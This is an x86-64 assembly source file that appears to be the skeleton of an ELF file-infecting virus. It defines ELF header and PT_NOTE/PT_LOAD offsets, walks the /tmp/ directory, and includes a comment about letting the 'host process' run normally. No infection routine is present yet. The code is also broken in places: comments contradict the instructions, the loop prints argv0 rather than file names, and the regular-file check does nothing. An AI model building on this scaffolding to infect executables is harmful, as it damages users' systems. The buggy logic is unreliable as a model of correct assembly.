%define SYS_EXIT         60
%define SYS_OPEN         2
%define SYS_CLOSE        3
%define SYS_WRITE        1
%define SYS_READ         0
%define SYS_EXECVE       59
%define SYS_GETDENTS64   217
%define SYS_FSTAT        5
%define SYS_LSEEK        8
%define SYS_PREAD64      17
%define SYS_PWRITE64     18
%define SYS_SYNC         162

%define DT_REG			8

%define SEEK_END		2
%define DIRENT_BUFFSIZE	1024

%define PT_LOAD			1
%define PT_NOTE			4

%define O_RDONLY        00000000
%define O_WRONLY        00000001
%define O_RDWR          00000002

%define argv0			[rsp + 8]
%define argc			[rsp + 4]

; r15 + 0 = stack buffer = stat
; r15 + 48 = stat.st_size

; r15 + 144 = ehdr
; r15 + 148 = ehdr.class
; r15 + 152 = ehdr.pad
; r15 + 168 = ehdr.entry
; r15 + 176 = ehdr.phoff
; r15 + 198 = ehdr.phentsize
; r15 + 200 = ehdr.phnum

; r15 + 208 = phdr = phdr.type
; r15 + 212 = phdr.flags
; r15 + 216 = phdr.offset
; r15 + 224 = phdr.vaddr
; r15 + 232 = phdr.paddr
; r15 + 240 = phdr.filesz
; r15 + 248 = phdr.memsz
; r15 + 256 = phdr.align

; r15 + 300 = jmp rel

; r15 + 350 = directory size

; r15 + 400 = dirent = dirent.d_ino
; r15 + 416 = dirent.d_reclen
; r15 + 418 = dirent.d_type
; r15 + 419 = dirent.d_name

section .text
	global _start
_start:
    mov r14, [rsp + 8]                                          ; saving argv0 to r14
    push rdx
    push rsp
    sub rsp, 5000                                               ; reserving 5000 bytes
    mov r15, rsp  
	call dirent
	call exit
dirent:
	push "/tmp/"                                                ; pushing "." to stack (rsp)
	mov rdi, rsp                                            ; moving "." to rdi
	mov rsi, O_RDONLY
	xor rdx, rdx                                            ; not using any flags
	mov rax, SYS_OPEN
	syscall

	pop rdi
	cmp rax, 0
	jle	err

	mov rdi, rax
	lea rsi, [r15 + 400]
	mov rdx, DIRENT_BUFFSIZE
	mov rax, SYS_GETDENTS64
	syscall   

	cmp rax, 0
	jle err

	mov qword [r15 + 350], rax
	mov rax, SYS_CLOSE
	syscall
	
	xor rcx, rcx
for_each_file:
	push rcx
	push rdi
	push rcx
	mov rdi, r14
	call puts
	pop rcx
	pop rdi
	cmp byte [r15 + 418 + rcx], DT_REG
	jne .continue
	.continue:
		pop rcx
		add cx, word [rcx + r15 + 416]
		cmp rcx, qword [r15 + 350]
		jne for_each_file
	cleanup:
    add rsp, 5000                                               ; restoring stack so host process can run normally, this also could use some improvement
    ; pop rsp
    ; pop rdx
	call exit
puts:
	call strlen
	mov rdx, rax		;strlen
	mov rsi, rdi		;buff
	mov rdi, 1			;fd
	mov rax, SYS_WRITE	;syscall
	syscall
	push 0xa
	mov rsi, rsp
	mov rdx, 1
	mov rdi, 1
	mov rax, SYS_WRITE
	syscall
	pop rsi
	ret

strlen:
	xor rax, rax
	.loop:
		cmp byte [rdi + rax], 0
		je .end
		inc rax
		jmp strlen.loop
	.end:
		ret
exit:
	mov rax, SYS_EXIT
	mov rdi, 0
	syscall
err:
	mov rax, SYS_EXIT
	mov rdi, 0xfffffff
	syscall
